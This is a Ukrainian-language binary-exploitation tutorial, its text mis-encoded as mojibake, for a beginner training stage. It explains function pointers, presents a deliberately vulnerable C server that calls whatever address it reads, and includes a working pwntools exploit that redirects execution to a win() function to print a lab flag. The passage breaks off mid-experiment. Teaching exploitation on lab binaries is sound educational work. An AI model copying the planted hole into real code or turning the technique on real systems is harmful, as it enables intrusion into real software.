# Stage 04: Demo No Offset - –ü—Ä—è–º–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó

## üéØ –ú–µ—Ç–∞ –∑–∞–≤–¥–∞–Ω–Ω—è

–ó—Ä–æ–∑—É–º—ñ—Ç–∏ **–∫–æ–Ω—Ü–µ–ø—Ü—ñ—é –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è** –±–µ–∑ —Å–∫–ª–∞–¥–Ω–∏—Ö buffer overflow. –¶–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ —Å–ø—Ä–æ—â–µ–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π: –≤–∏ –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó, —ñ –≤–æ–Ω–∞ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è.

## üìö –©–æ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—å

- –©–æ —Ç–∞–∫–µ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∏–π –ø–æ–∫–∞–∂—á–∏–∫ (function pointer)
- –Ø–∫ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó —Å—Ç–∞—î –≤–∏–∫–ª–∏–∫–æ–º —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó
- –Ø–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `elf.symbols` –≤ pwntools
- –ß–æ–º—É PIE OFF —Ä–æ–±–∏—Ç—å –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–∏–º–∏
- –û—Å–Ω–æ–≤–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–æ—Ç–æ–∫—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è
- –Ø–∫ –ø—Ä–∞—Ü—é—î –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó —á–µ—Ä–µ–∑ –ø–æ–∫–∞–∂—á–∏–∫

## üîß –ù–µ–æ–±—Ö—ñ–¥–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

```bash
# Python —Ç–∞ pwntools
pip3 install pwntools

# –î–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–¥—Ä–µ—Å
sudo apt install binutils  # objdump, readelf
```

## üìñ –¢–µ–æ—Ä–µ—Ç–∏—á–Ω–∞ –æ—Å–Ω–æ–≤–∞

### –©–æ —Ç–∞–∫–µ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∏–π –ø–æ–∫–∞–∂—á–∏–∫?

**–§—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∏–π –ø–æ–∫–∞–∂—á–∏–∫** - —Ü–µ –∑–º—ñ–Ω–Ω–∞, —è–∫–∞ –∑–±–µ—Ä—ñ–≥–∞—î –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–∞–º'—è—Ç—ñ.

```c
void hello() {
    printf("Hello!\n");
}

int main() {
    // fp - —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∏–π –ø–æ–∫–∞–∂—á–∏–∫
    void (*fp)(void) = hello;  // fp —Ç–µ–ø–µ—Ä –≤–∫–∞–∑—É—î –Ω–∞ hello

    fp();  // –í–∏–∫–ª–∏–∫–∞—î hello()! –í–∏–≤–µ–¥–µ "Hello!"

    return 0;
}
```

### –ê–Ω–∞—Ç–æ–º—ñ—è –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó

```
–ü–∞–º'—è—Ç—å –ø—Ä–æ–≥—Ä–∞–º–∏:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  0x401000: main()   ‚îÇ
‚îÇ  0x401136: win()    ‚îÇ  ‚Üê –¶—è –∞–¥—Ä–µ—Å–∞!
‚îÇ  0x401200: ...      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

–ö–æ–¥:
void (*fp)(void) = (void(*)(void))0x401136;  // fp = –∞–¥—Ä–µ—Å–∞ win()
fp();  // –ü—Ä–æ—Ü–µ—Å–æ—Ä —Å—Ç—Ä–∏–±–∞—î –Ω–∞ 0x401136 —ñ –≤–∏–∫–æ–Ω—É—î win()!
```

### –Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î –Ω–∞ —Ä—ñ–≤–Ω—ñ –ø—Ä–æ—Ü–µ—Å–æ—Ä–∞?

```asm
; –ó–≤–∏—á–∞–π–Ω–∏–π –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó
call win          ; –ü—Ä–æ—Ü–µ—Å–æ—Ä: "–ü–µ—Ä–µ–π–¥–∏ –Ω–∞ –∞–¥—Ä–µ—Å—É win"

; –í–∏–∫–ª–∏–∫ —á–µ—Ä–µ–∑ –ø–æ–∫–∞–∂—á–∏–∫ (–Ω–∞—à –≤–∏–ø–∞–¥–æ–∫)
mov rax, 0x401136 ; –ü–æ–º—ñ—Å—Ç–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –≤ —Ä–µ–≥—ñ—Å—Ç—Ä
call rax          ; –í–∏–∫–æ–Ω–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é –∑–∞ –∞–¥—Ä–µ—Å–æ—é –≤ rax
```

## üíª –ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É —Å–µ—Ä–≤–µ—Ä–∞

–î–∞–≤–∞–π—Ç–µ –¥–µ—Ç–∞–ª—å–Ω–æ —Ä–æ–∑–±–µ—Ä–µ–º–æ `server.c`:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// –§—É–Ω–∫—Ü—ñ—è-—Ü—ñ–ª—å: –º–∏ —Ö–æ—á–µ–º–æ —ó—ó –≤–∏–∫–ª–∏–∫–∞—Ç–∏
__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE4_DIRECT_JUMP}");
    fflush(stdout);
    _exit(0);
}

int main(void){
    // –û–≥–æ–ª–æ—à—É—î–º–æ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∏–π –ø–æ–∫–∞–∂—á–∏–∫, —Å–ø–æ—á–∞—Ç–∫—É NULL
    void (*fp)(void) = NULL;

    // –ß–∏—Ç–∞—î–º–æ 8 –±–∞–π—Ç (64-bit –∞–¥—Ä–µ—Å—É) –∑ stdin
    ssize_t n = read(0, &fp, 8);

    // –Ø–∫—â–æ –ø—Ä–æ—á–∏—Ç–∞–ª–∏ –Ω–µ 8 –±–∞–π—Ç - –≤–∏—Ö–æ–¥–∏–º–æ
    if(n != 8) return 0;

    // –í–ò–ö–õ–ò–ö–ê–Ñ–ú–û —Ñ—É–Ω–∫—Ü—ñ—é –∑–∞ –∞–¥—Ä–µ—Å–æ—é, —è–∫—É –º–∏ –Ω–∞–¥—ñ—Å–ª–∞–ª–∏!
    fp();

    return 0;
}
```

### –©–æ —Ç—É—Ç –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø–æ–∫—Ä–æ–∫–æ–≤–æ:

**–ö—Ä–æ–∫ 1:** –ü—Ä–æ–≥—Ä–∞–º–∞ –æ–≥–æ–ª–æ—à—É—î –ø–æ–∫–∞–∂—á–∏–∫ `fp`:
```c
void (*fp)(void) = NULL;
```
- `fp` - —Ü–µ –∑–º—ñ–Ω–Ω–∞ —Ä–æ–∑–º—ñ—Ä–æ–º 8 –±–∞–π—Ç (–Ω–∞ 64-bit —Å–∏—Å—Ç–µ–º—ñ)
- –°–ø–æ—á–∞—Ç–∫—É –≤–æ–Ω–∞ NULL (0x0000000000000000)

**–ö—Ä–æ–∫ 2:** –ß–∏—Ç–∞—î 8 –±–∞–π—Ç –∑ –≤–≤–æ–¥—É **–±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ fp**:
```c
read(0, &fp, 8);
```
- `&fp` - –∞–¥—Ä–µ—Å–∞ —Å–∞–º–æ—ó –∑–º—ñ–Ω–Ω–æ—ó fp –≤ –ø–∞–º'—è—Ç—ñ
- –©–æ –± –≤–∏ –Ω–µ –≤—ñ–¥–ø—Ä–∞–≤–∏–ª–∏, –±—É–¥–µ –∑–∞–ø–∏—Å–∞–Ω–æ –≤ fp

**–ö—Ä–æ–∫ 3:** –í–∏–∫–ª–∏–∫–∞—î —Ñ—É–Ω–∫—Ü—ñ—é –∑–∞ –∞–¥—Ä–µ—Å–æ—é –∑ fp:
```c
fp();
```
- –Ø–∫—â–æ –º–∏ –≤—ñ–¥–ø—Ä–∞–≤–∏–ª–∏ `0x401136` (–∞–¥—Ä–µ—Å—É win)
- –ü—Ä–æ—Ü–µ—Å–æ—Ä —Å—Ç—Ä–∏–±–Ω–µ –Ω–∞ `0x401136` —ñ –≤–∏–∫–æ–Ω–∞—î `win()`!

### –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è –ø–∞–º'—è—Ç—ñ

**–î–æ —á–∏—Ç–∞–Ω–Ω—è:**
```
Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ fp = 0x0000 ‚îÇ  ‚Üê NULL
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ú–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ:** `\x36\x11\x40\x00\x00\x00\x00\x00` (–∞–¥—Ä–µ—Å–∞ 0x401136)

**–ü—ñ—Å–ª—è read():**
```
Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ fp = 0x401136 ‚îÇ  ‚Üê –ê–¥—Ä–µ—Å–∞ win()!
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ü—ñ—Å–ª—è fp():**
```
–ü—Ä–æ—Ü–µ—Å–æ—Ä —Å—Ç—Ä–∏–±–∞—î –Ω–∞ 0x401136:
‚Üí win() –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è
‚Üí FLAG{STAGE4_DIRECT_JUMP}
```

## üöÄ –ü–æ–∫—Ä–æ–∫–æ–≤–µ —Ä—ñ—à–µ–Ω–Ω—è

### –ö—Ä–æ–∫ 1: –ó–±—É–¥—É–π—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫

```bash
cd stage04_demo_no_offset
./build.sh
```

–í–∏–≤—ñ–¥:
```
[*] Building stage04_demo_no_offset...
[+] Built: ../build/stage04_demo_no_offset
[+] Binary has win() function at a fixed address
```

### –ö—Ä–æ–∫ 2: –ó–Ω–∞–π–¥—ñ—Ç—å –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó win()

## üîç –Ø–∫ –ü–†–ê–í–ò–õ–¨–ù–û —á–∏—Ç–∞—Ç–∏ objdump?

**–°–ø–æ—Å—ñ–± 1: –ß–µ—Ä–µ–∑ objdump (–Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏–π)**
```bash
objdump -d ../build/stage04_demo_no_offset | grep '<win>'
```

**–í–∏–≤—ñ–¥:**
```
0000000000401136 <win>:
  401136:	f3 0f 1e fa          	endbr64
  40113a:	48 83 ec 08          	sub    $0x8,%rsp
```

**–†–æ–∑–±—ñ—Ä –≤–∏–≤–æ–¥—É:**
```
0000000000401136 <win>:
‚îÇ               ‚îÇ ‚îÇ    ‚îÇ
‚îÇ               ‚îÇ ‚îÇ    ‚îî‚îÄ –ù–∞–∑–≤–∞ —Ñ—É–Ω–∫—Ü—ñ—ó
‚îÇ               ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ –°–∏–º–≤–æ–ª —â–æ –ø–æ–∑–Ω–∞—á–∞—î —Ñ—É–Ω–∫—Ü—ñ—é
‚îÇ               ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ –ê–¥—Ä–µ—Å–∞ –∑ –ü–†–û–í–Ü–î–ù–ò–ú–ò –ù–£–õ–Ø–ú–ò
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ –ü–æ–≤–Ω–∞ 64-bit –∞–¥—Ä–µ—Å–∞
```

**–í–ê–ñ–õ–ò–í–û –¥–ª—è Python:**
```python
# ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û (–Ω–µ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å Python):
win_addr = 0000000000401136    # SyntaxError!

# ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û (–¥–µ—Å—è—Ç–∫–æ–≤–µ —á–∏—Å–ª–æ):
win_addr = 401136              # –¶–µ 401136‚ÇÅ‚ÇÄ, –∞ –Ω–µ 0x401136

# ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û (hex –∑ –ø—Ä–µ—Ñ—ñ–∫—Å–æ–º 0x):
win_addr = 0x401136            # Hex —á–∏—Å–ª–æ –≤ Python

# ‚úÖ –ê–ë–û –ø—Ä–∏–±–∏—Ä–∞—î–º–æ –∑–∞–π–≤—ñ –Ω—É–ª—ñ:
# –ó objdump: 0000000000401136
# –í Python:  0x401136
```

**–®–≤–∏–¥–∫–∏–π —Å–ø–æ—Å—ñ–± –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó:**
```bash
# –û—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ:
objdump -d binary | grep '<win>' | awk '{print "0x" $1}' | head -1
# –í–∏–≤—ñ–¥: 0x401136
```

**–°–ø–æ—Å—ñ–± 2: –ß–µ—Ä–µ–∑ readelf**
```bash
readelf -s ../build/stage04_demo_no_offset | grep win
```

**–í–∏–≤—ñ–¥:**
```
    62: 0000000000401136    30 FUNC    GLOBAL DEFAULT   16 win
```

**–†–æ–∑–±—ñ—Ä:**
- –ö–æ–ª–æ–Ω–∫–∞ 2: `0000000000401136` - –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó
- –ö–æ–ª–æ–Ω–∫–∞ 3: `30` - —Ä–æ–∑–º—ñ—Ä —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –±–∞–π—Ç–∞—Ö
- –ö–æ–ª–æ–Ω–∫–∞ 4: `FUNC` - —Ç–∏–ø —Å–∏–º–≤–æ–ª—É (—Ñ—É–Ω–∫—Ü—ñ—è)
- –ö–æ–ª–æ–Ω–∫–∞ 8: `win` - –Ω–∞–∑–≤–∞

**–°–ø–æ—Å—ñ–± 3: –ß–µ—Ä–µ–∑ nm**
```bash
nm ../build/stage04_demo_no_offset | grep win
```

**–í–∏–≤—ñ–¥:**
```
0000000000401136 T win
```
- `T` –æ–∑–Ω–∞—á–∞—î —Ç–µ–∫—Å—Ç–æ–≤–∞ —Å–µ–∫—Ü—ñ—è (–∫–æ–¥)

**–°–ø–æ—Å—ñ–± 4: –ß–µ—Ä–µ–∑ pwntools (–ù–ê–ô–ö–†–ê–©–ò–ô - –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π)**
```python
from pwn import *
elf = ELF('../build/stage04_demo_no_offset')
win_addr = elf.symbols['win']
print(f"win() at: {hex(win_addr)}")  # win() at: 0x401136
```

**–ü–µ—Ä–µ–≤–∞–≥–∏ pwntools:**
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç
- ‚úÖ –ù–µ —Ç—Ä–µ–±–∞ –ø–∞—Ä—Å–∏—Ç–∏ –≤–∏–≤—ñ–¥
- ‚úÖ –ü—Ä–∞—Ü—é—î –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Å–∏–º–≤–æ–ª–∏ stripped (—á–µ—Ä–µ–∑ –¥–∏–∑–∞—Å–µ–º–±–ª—é–≤–∞–Ω–Ω—è)

## ‚ö†Ô∏è –ß–∞—Å—Ç—ñ –ø–æ–º–∏–ª–∫–∏ –Ω–æ–≤–∞—á–∫—ñ–≤

### –ü–æ–º–∏–ª–∫–∞ 1: "KeyError: 'win'"
```python
elf = ELF('./binary')
win = elf.symbols['win']  # KeyError: 'win'
```

**–ü—Ä–∏—á–∏–Ω–∞:** –°–∏–º–≤–æ–ª–∏ –≤–∏–¥–∞–ª–µ–Ω–æ (stripped binary)
```bash
file ./binary
# output: ELF 64-bit LSB executable, stripped  ‚Üê –ü–†–û–ë–õ–ï–ú–ê!
```

**–†—ñ—à–µ–Ω–Ω—è 1:** –ó–Ω–∞–π—Ç–∏ –≤—Ä—É—á–Ω—É —á–µ—Ä–µ–∑ objdump
```bash
objdump -d ./binary | grep -A5 "FLAG"
# –®—É–∫–∞–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—é —â–æ –º—ñ—Å—Ç–∏—Ç—å —Ä—è–¥–æ–∫ FLAG
```

**–†—ñ—à–µ–Ω–Ω—è 2:** –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ–Ω—à—É —Ç–µ—Ö–Ω—ñ–∫—É (format string, ROP)

### –ü–æ–º–∏–ª–∫–∞ 2: "–í—ñ–¥–ø—Ä–∞–≤–∏–≤ –∞–¥—Ä–µ—Å—É, –Ω—ñ—á–æ–≥–æ –Ω–µ –ø—Ä–∞—Ü—é—î"
```python
# ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û (–≤—ñ–¥–ø—Ä–∞–≤–ª—è—î —Ä—è–¥–æ–∫, –Ω–µ –±–∞–π—Ç–∏):
io.send("0x401136")

# ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û (–≤—ñ–¥–ø—Ä–∞–≤–ª—è—î int —è–∫ —î):
io.send(0x401136)

# ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û (packed –≤ –±–∞–π—Ç–∏ little-endian):
io.send(p64(0x401136))
```

### –ü–æ–º–∏–ª–∫–∞ 3: "–í–∏–∫–æ—Ä–∏—Å—Ç–∞–≤ 32-bit packing –Ω–∞ 64-bit –ø—Ä–æ–≥—Ä–∞–º—ñ"
```python
# –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä—É:
file ./binary
# ELF 64-bit ... ‚Üê –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π p64()
# ELF 32-bit ... ‚Üê –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π p32()

# 64-bit:
payload = p64(0x401136)   # 8 –±–∞–π—Ç

# 32-bit:
payload = p32(0x401136)   # 4 –±–∞–π—Ç–∏
```

### –ü–æ–º–∏–ª–∫–∞ 4: "–ü—Ä–æ–≥—Ä–∞–º–∞ –∫—Ä–∞—à–∏—Ç—å –∑ SIGSEGV"
**–ú–æ–∂–ª–∏–≤—ñ –ø—Ä–∏—á–∏–Ω–∏:**
1. –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞ –∞–¥—Ä–µ—Å–∞
2. –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π packing (p32 –∑–∞–º—ñ—Å—Ç—å p64)
3. –í—ñ–¥–ø—Ä–∞–≤–∏–ª–∏ –Ω–µ —Ç—ñ –±–∞–π—Ç–∏

**Debugging:**
```python
from pwn import *
context.log_level = 'debug'  # –ü–æ–∫–∞–∑—É—î –í–°–ï

# –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ payload:
payload = p64(0x401136)
print(f"Payload hex: {payload.hex()}")
# –ú–∞—î –±—É—Ç–∏: 3611400000000000 (little-endian)

# –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥–æ–≤–∂–∏–Ω—É:
print(f"Length: {len(payload)}")  # –ú–∞—î –±—É—Ç–∏ 8
```

### –ö—Ä–æ–∫ 3: –°—Ç–≤–æ—Ä—ñ—Ç—å exploit

–°—Ç–≤–æ—Ä—ñ—Ç—å —Ñ–∞–π–ª `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫ –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É
elf = ELF('../build/stage04_demo_no_offset', checksec=False)

# –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ—Ç—Ä–∏–º—É—î–º–æ –∞–¥—Ä–µ—Å—É win()
win_addr = elf.symbols['win']
log.info(f"–ê–¥—Ä–µ—Å–∞ win(): {hex(win_addr)}")

# –ó–∞–ø—É—Å–∫–∞—î–º–æ –ª–æ–∫–∞–ª—å–Ω–∏–π –ø—Ä–æ—Ü–µ—Å
io = process('../build/stage04_demo_no_offset')

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∞–¥—Ä–µ—Å—É win() (8 –±–∞–π—Ç, little-endian)
payload = p64(win_addr)
log.info(f"–í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ payload: {payload.hex()}")
io.send(payload)

# –û—Ç—Ä–∏–º—É—î–º–æ –ø—Ä–∞–ø–æ—Ä
flag = io.recvall(timeout=1)
log.success(f"–ü—Ä–∞–ø–æ—Ä: {flag.decode().strip()}")

io.close()
```

### –ö—Ä–æ–∫ 4: –ó–∞–ø—É—Å—Ç—ñ—Ç—å exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

### –ö—Ä–æ–∫ 5: –û—Ç—Ä–∏–º–∞–π—Ç–µ –ø—Ä–∞–ø–æ—Ä

–í–∏–≤—ñ–¥:
```
[*] '/path/to/build/stage04_demo_no_offset'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] –ê–¥—Ä–µ—Å–∞ win(): 0x401136
[+] Starting local process '../build/stage04_demo_no_offset': pid 12345
[*] –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ payload: 3611400000000000
[+] Receiving all data: Done (24B)
[*] Process '../build/stage04_demo_no_offset' stopped with exit code 0
[+] –ü—Ä–∞–ø–æ—Ä: FLAG{STAGE4_DIRECT_JUMP}
```

## üîç –î–µ—Ç–∞–ª—å–Ω–∏–π —Ä–æ–∑–±—ñ—Ä

### –ß–æ–º—É PIE=OFF –≤–∞–∂–ª–∏–≤–æ?

```bash
checksec --file=../build/stage04_demo_no_offset
```

```
PIE:      No PIE (0x400000)
```

**PIE OFF –æ–∑–Ω–∞—á–∞—î:**
- –ê–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π **—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ** –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–ø—É—Å–∫—É
- `win()` –∑–∞–≤–∂–¥–∏ –Ω–∞ **0x401136** (–∞–±–æ —ñ–Ω—à—ñ–π —Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ–π –∞–¥—Ä–µ—Å—ñ)
- –ù–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω leak –∞–¥—Ä–µ—Å–∏

**–Ø–∫–±–∏ PIE ON:**
```
–ó–∞–ø—É—Å–∫ 1: win() –Ω–∞ 0x555555554136
–ó–∞–ø—É—Å–∫ 2: win() –Ω–∞ 0x55555557a136  ‚Üê –Ü–Ω—à–∞ –∞–¥—Ä–µ—Å–∞!
–ó–∞–ø—É—Å–∫ 3: win() –Ω–∞ 0x5555555f2136  ‚Üê –ó–Ω–æ–≤—É —ñ–Ω—à–∞!
```
‚Üí –ü–æ—Ç—Ä—ñ–±–µ–Ω –±—É–≤ –±–∏ –≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏

### –©–æ —Ç–∞–∫–µ p64()?

`p64()` - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è pwntools –¥–ª—è **–ø–∞–∫—É–≤–∞–Ω–Ω—è** —á–∏—Å–ª–∞ –≤ –±–∞–π—Ç–∏.

```python
from pwn import *

# –ß–∏—Å–ª–æ ‚Üí –ë–∞–π—Ç–∏ (Little Endian)
addr = 0x401136
packed = p64(addr)

print(f"–ß–∏—Å–ª–æ:    {hex(addr)}")
print(f"–ë–∞–π—Ç–∏:    {packed}")
print(f"Hex:      {packed.hex()}")
print(f"–î–æ–≤–∂–∏–Ω–∞:  {len(packed)} –±–∞–π—Ç")
```

–í–∏–≤—ñ–¥:
```
–ß–∏—Å–ª–æ:    0x401136
–ë–∞–π—Ç–∏:    b'\x36\x11\x40\x00\x00\x00\x00\x00'
Hex:      3611400000000000
–î–æ–≤–∂–∏–Ω–∞:  8 –±–∞–π—Ç
```

**Little Endian** –æ–∑–Ω–∞—á–∞—î "–º–æ–ª–æ–¥—à–∏–π –±–∞–π—Ç –ø–µ—Ä—à–∏–º":
- `0x00401136` ‚Üí –±–∞–π—Ç–∏: `36 11 40 00 00 00 00 00`
- –ü–µ—Ä—à–∏–π –±–∞–π—Ç (36) - —Ü–µ –Ω–∞–π–º–µ–Ω—à–∏–π
- –û—Å—Ç–∞–Ω–Ω—ñ–π –±–∞–π—Ç (00) - —Ü–µ –Ω–∞–π—Å—Ç–∞—Ä—à–∏–π

### –ß–æ–º—É —Å–∞–º–µ 8 –±–∞–π—Ç?

```c
read(0, &fp, 8);  // –ß–∏—Ç–∞—î —Ä—ñ–≤–Ω–æ 8 –±–∞–π—Ç
```

- –ù–∞ **64-bit —Å–∏—Å—Ç–µ–º—ñ** –ø–æ–∫–∞–∂—á–∏–∫ –∑–∞–π–º–∞—î **8 –±–∞–π—Ç** (64 –±—ñ—Ç–∏)
- –ù–∞ **32-bit —Å–∏—Å—Ç–µ–º—ñ** –ø–æ–∫–∞–∂—á–∏–∫ –∑–∞–π–º–∞—î **4 –±–∞–π—Ç–∏** (32 –±—ñ—Ç–∏)

```
64-bit –∞–¥—Ä–µ—Å–∞:  0x0000000000401136  (8 –±–∞–π—Ç)
32-bit –∞–¥—Ä–µ—Å–∞:  0x00401136          (4 –±–∞–π—Ç–∏)
```

## üéì –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∏

### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç 1: –í—ñ–¥–ø—Ä–∞–≤—Ç–µ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –∞–¥—Ä–µ—Å—É

```python
#!/usr/bin/env python3
from pwn import *

io = process('../build/stage04_demo_no_offset')

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –≤–∏–ø–∞–¥–∫–æ–≤—É –∞–¥—Ä–µ—Å—É
bad_addr = 0xdeadbeef
io.send(p64(bad_addr))

try:
    output = io.recvall(timeout=1)
    print(output)
except:
    print("–ü—Ä–æ—Ü–µ—Å –∫—Ä–∞—à–Ω—É–≤—Å—è (–æ—á—ñ–∫—É–≤–∞–Ω–æ)")
```

–†–µ–∑—É–ª—å—Ç–∞—Ç: **Segmentation fault** - –ø—Ä–æ—Ü–µ—Å –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ –∑–∞ –Ω–µ—ñ—Å–Ω—É—é—á–æ—é –∞–¥—Ä–µ—Å–æ—é.

### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç 2: –í—ñ–¥–ø—Ä–∞–≤—Ç–µ –∞–¥—Ä–µ—Å—É main()

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage04_demo_no_offset', checksec=False)
io = process('../build/stage04_demo_no_offset')

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∞–¥—Ä–µ—Å—É main –∑–∞–º—ñ—Å—Ç—å win
main_addr = elf.symbols['main']
log.info(f"–í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∞–¥—Ä–µ—Å—É main: {hex(main_addr)}")
io.send(p64(main_addr))

# –©–æ —Å—Ç–∞–Ω–µ—Ç—å—Å—è?
try:
    output = io.recvall(timeout=2)
